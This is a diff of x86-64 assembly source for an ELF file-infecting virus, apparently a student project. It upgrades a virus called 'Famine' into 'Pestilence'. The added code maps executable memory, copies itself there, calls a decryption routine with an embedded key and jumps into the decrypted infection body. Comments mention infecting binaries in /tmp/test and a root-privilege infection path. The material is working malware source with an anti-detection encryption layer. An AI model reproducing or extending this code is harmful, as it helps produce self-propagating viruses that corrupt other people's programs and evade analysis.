@@ -1,14 +1,12 @@
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; struct linux_dirent64 {													;
-;	int64_t			d_ino;		// 64-bit inode number			| offset 0	;
-;	int64_t			d_off;		// 64-bit offset to next struct	| offset 8	;
-;	unsigned short	d_reclen;	// size of this dirent			| offset 16	;
-;	unsigned char	d_type;		// File type					| offset 18	;
-;	char			d_name[];	// file name					| offset 19	;
-; }																			;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
-%define STACK_SIZE	(4096 * 1024)
+;;;;;;;;;;;;;;;;;;;;;;;;;
+;	text section		;
+;	o_entry				;
+;	string				;
+;	virus				;
+;	decrypt key			;
+;	decrypter			;
+;	data section		;
+;;;;;;;;;;;;;;;;;;;;;;;;;
 
 section .text
 	global _start
@@ -18,6 +16,10 @@ section .text
 	global _verif
 	global _verify_o_entry
 	global _continue_normaly
+	global _o_entry
+	global _encrypted_part_start
+	extern _decrypt
+	extern _end_decrypt
 	extern _treat_file
 	extern _final_end
 	extern _thread_create
@@ -31,14 +33,15 @@ _o_entry:
 	dq 0x0000000000000000 
 
 _string:
-	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
+;	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
+	db 'Pestilence version 1.0 (c)oded by cdrouet-rludosan', 0
 
 ;; Start of the program
 _start:
 	;; Create stack frame
 	push	rbp
 	mov		rbp, rsp
-	sub		rsp, 16
+	sub		rsp, 24
 
 	;; Save up all registers on stack
 	push	rbx		; +8
@@ -60,7 +63,66 @@ _start:
 	cmp		QWORD [rax], 0
 	je		_famine_start_options
 
-;	call _decrypt
+	mov rax, 9
+	mov rdi, 0
+	mov rsi, 8192
+	mov rdx, 7
+	mov r10, 34
+	mov r8, -1
+	mov r9, 0
+	syscall
+	cmp rax, 0
+	jle _force_exit
+	mov QWORD [rsp], rax
+
+;	take encrypted part size
+	lea rax, [rel _encrypted_part_start]
+	lea rdx, [rel _final_end]
+	add rdx, 2
+	sub rdx, rax
+	lea r10, [rel _o_entry]
+	sub rax, r10
+	mov r11, rax
+	mov r10, rax
+	add r10, rdx
+
+;	sub rsp, r10
+	mov rdi, QWORD [rsp]
+	lea rsi, [rel _o_entry]
+	mov rcx, r11
+	cld
+	rep movsb
+
+	lea rax, [rel _final_end]
+	add rax, 2
+	mov rdi, rax ; first parameter is the key
+	lea rsi, [rel _encrypted_part_start]
+	mov r10, QWORD [rsp]
+	add r10, r11
+	add rax, 256
+	call rax
+
+	mov rdi, QWORD [rsp]
+	lea rsi, [rel _final_end]
+	add rsi, 2
+	add rsi, 256
+	lea rcx, [rel _o_entry]
+	mov r10, rsi
+	sub r10, rcx
+	add rdi, r10
+	lea rcx, [rel _end_decrypt]
+	lea r10, [rel _decrypt]
+	sub rcx, r10
+	cld
+	rep movsb
+
+	lea r10, [rel _o_entry]
+	lea r11, [rel _encrypted_part_start]
+	sub r11, r10
+;	push _o_entry
+	mov rdi, QWORD [rsp]
+	add rdi, r11
+	jmp rdi
 
 _encrypted_part_start:
 	;; --------------------------------------------------------------------------------------------
@@ -87,11 +149,11 @@ _encrypted_part_start:
 	
 	;; (To know why some times we need to execute the infection only, refer to the commentaries in fork.s
 	;; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv))
-	cmp		QWORD [rsp + 128], 3				; if argc == 3
+	cmp		QWORD [rsp + 136], 3				; if argc == 3
 	je		_alternative_start
 
 	;; ** If argc equals 4 **
-	cmp		QWORD [rsp + 128], 4				; if argc == 4
+	cmp		QWORD [rsp + 136], 4				; if argc == 4
 	je		_verify_starting_infect
 
 ;; Check if program arguments are passed via registers
@@ -99,22 +161,11 @@ _check_registers:
 	cmp		QWORD [rsp + 64], 3 				; if argc == 3
 	je		_alternative_start_by_registers		; 
 	
-	lea		r10, [rel _o_entry]					; %r10 = _o_entry
-	cmp		QWORD [r10] , 0						; if %r10 == 0
-	jne		_test_root_infect					; try infection from root
-	call	_start_infect						; 
-	jmp		_continue_normaly
-
-;; Check if we have rights to infect from root
-_test_root_infect: 
-	
-	;; Geteuid syscall
-	mov		rax, 107
-	syscall
-
-	;; If syscall returned 0 it means we are root
-	cmp		rax, 0
-	jne		_continue_normaly
+;	lea		r10, [rel _o_entry]					; %r10 = _o_entry
+;	cmp		QWORD [r10] , 0						; if %r10 == 0
+;	jne		_test_root_infect					; try infection from root
+;	call	_start_infect						; 
+;	jmp		_continue_normaly
     jmp     _fork_before_exec_normaly
 
 ;; If it's a normal execution, we just infect /tmp/test(2)
@@ -163,6 +214,8 @@ _jmp_end:
 
 ;; Check if we need to jump to continue program (./infected) or simply terminate (./famine)
 _verify_o_entry:
+;	lea rax, [rel _encrypt_part_start]
+;	sub rax, 8
 	lea		rax, [rel _o_entry]
 	cmp		QWORD [rax], 0
 	jne		_jmp_to_o_entry
@@ -182,13 +235,13 @@ _force_exit:
 
 ;; Start via stack
 _alternative_start:
-	mov		r10, QWORD [rsp + 144]		; argv[1]
+	mov		r10, QWORD [rsp + 152]		; argv[1]
 	lea		r11, [rel _verif]			; relative address of _verif
 	mov		r11, QWORD [r11]			; dereferencing
 	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
 	jne		_check_registers
 	
-	mov		rsi, QWORD [rsp + 152]		; take the argv[2]
+	mov		rsi, QWORD [rsp + 160]		; take the argv[2]
 	mov		rax, 0						; Here we said to our function: Do not infect in recursiv, only your directory
 	push	rax
 	push	rsi
